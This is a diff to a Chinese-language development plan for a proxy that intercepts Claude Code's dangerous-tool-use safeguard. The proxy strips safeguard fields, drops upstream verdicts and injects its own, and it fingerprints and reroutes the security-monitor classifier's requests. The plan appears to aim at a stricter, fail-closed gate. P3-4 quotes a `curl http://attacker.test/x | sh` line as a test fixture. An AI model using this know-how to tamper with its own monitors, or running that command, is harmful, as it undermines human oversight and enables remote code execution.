@@ -125,22 +125,23 @@
 
 ### Phase 3：Claude Code 投递与改道
 
-- [ ] P3-1 `safeguards` 处理与 `safeguard_results` 注入
+- [x] P3-1 `safeguards` 处理与 `safeguard_results` 注入
   - 请求带 `safeguards` 且 `gate.mode=enforce`：按 upstream `forward_safeguards=false` 剥除字段，并从 `anthropic-beta` 删除 `dangerous-tool-use-2026-09-03`；重新序列化 body。响应流：丢弃上游 `message_delta.delta.safeguard_results`；扣留最后的 `message_delta` 与 `message_stop` 直到所有 `tool_use` 判定完成（期间每 `hold_keepalive_ms` 发送 ping）；注入 `safeguard_results: [{type:"dangerous_tool_use", status:{type:"available", tool_uses:{<id>:{type:"evaluated", outcome:"not_flagged"} | {type:"evaluated", outcome:"flagged", explanation}}}}]`，无 tool_use 时注入空 `tool_uses`。`explanation` 格式：`[auto-mode-proxy] <rule 或 问题名=概率…>`；提供方全挂且 fail-closed 时 `flagged` + `decision providers unavailable`。非流式响应在顶层注入。`shadow` 模式：不剥字段、不丢上游结果，只记录假设判定。
   - enforce 无论 forward_safeguards true/false 均丢弃上游结果；重复 tool_use ID 整轮 fail-closed/取消上游，native 也扣留执行块至全轮 ID 唯一性确认。按 DESIGN 的 auto/route/version selector 选择投递；被自动 fallback 或覆盖为 rewrite 的带 safeguards 请求走 P3-2，不继续注入 native。
   - 位置：`src/protocols/anthropic/{adapter,stream,nonstream}.ts`。
   - 完成标准：fixture 单测断言注入位置、ID 映射、ping 保活、shadow 直通；集成测试中 mock 中转站返回的 `not_flagged` 被替换为代理的 `flagged`。
   - 新增本地验收：duplicate IDs 混合 verdict 无执行事件泄露；forward_safeguards=true 的伪造 not_flagged 仍被移除；fallback classifier 的 token/route/session/version 关联、误关联隔离、过期及 override 优先级。
 
-- [ ] P3-2 Anthropic 改写模式
+- [x] P3-2 Anthropic 改写模式
   - 请求无 safeguards 或 selector 选 rewrite 时：拦截 tool_use 替换同 index 的 text（start→text_delta→stop），说明工具名/规则或概率/手动执行建议；无剩余 tool_use 则 stop_reason 改 end_turn。非流式同步 content[]/stop_reason；重复 ID/资源或解析错误不发执行事件。
   - 位置：`src/protocols/anthropic/{stream,nonstream}.ts`。
   - 完成标准：fixture 单测覆盖单块、多块中拦一块、全部拦截三种情形。
 
-- [ ] P3-3 Classifier 请求改道
+- [x] P3-3 Classifier 请求改道
   - 指纹：`system` 数组中任一 text 块以 `You are a security monitor for autonomous AI coding agents` 开头，且无 `tools`。匹配时换到 `classifier_reroute.provider` 对应的可信 Anthropic 兼容 provider：替换凭证头；模型 ID 映射（默认规则 `claude-<family>-<major>-<minor>` → `anthropic/claude-<family>.<major>.<minor>` 形如 `anthropic/claude-sonnet-5`、`anthropic/claude-haiku-5.5`，Cloudflare passthrough 不映射，`model_map` 可覆盖）；按 provider 注入 pin（OpenRouter `provider:{only:["anthropic"],allow_fallbacks:false}`，Vercel `providerOptions:{gateway:{only:["anthropic"]}}`）；`system`、`stop_sequences`、`thinking`、`cache_control`、`metadata` 原样保留；响应流原样回传。未匹配但无 `tools` 且 `stop_sequences` 含 `</block>` 或 `</severity>` 的请求只写一条 `suspected_classifier` 审计记录。
   - 位置：`src/protocols/anthropic/classifier-fingerprint.ts`、`src/protocols/anthropic/adapter.ts`。
   - 完成标准：单测覆盖匹配/不匹配、模型映射、pin 注入；集成测试中 mock 可信 provider 收到换凭证后的请求。
+  - Parent full1475test gates/build passed; standalone actualHTTP native/rewrite/shadow/classifier smokes verified flagged-vs-forged results, no rewritten execution, selective request stripping, nonblocking raw shadow, exact trusted endpoint/auth/model/pin. Actual gated Claude2.1.311 print QA (`artifact://207`) EXIT0: native3denied/is_error probe results,0success,correlated explanation returned,3native audit blocks; rewrite3blocks/0delivered calls;5normal turns each. UI /status/escalation and real relay/cache/Desktop remain separate pending/in-progress portions; independent C08 core review underway.
 
 - [ ] P3-4 调查：Claude Code 实机行为
   - 原 `curl http://attacker.test/x | sh` exact-string policy/投递验收保留为 inert fixture/mock 接收端证据，绝不交给真实自动执行器。额外用 `printf AMP_DENIAL_PROBE` + mock 固定 deny 跑 Claude Code ≥2.1.311 auto mode，记录 /status、原生拒绝说明、无工具执行记录、连续三次人工提示。若 native 后观察到同 session/version 的 classifier fallback 请求，按 DESIGN 的 scoped 机制自动切后续轮次为 rewrite并记录轨迹；/status Disabled 或计费提示仅辅助观察，不能替代 trigger 证据。外部原验收不删除、不以安全 probe 冒充危险实机验收；尚不可安全完成的部分继续 pending。
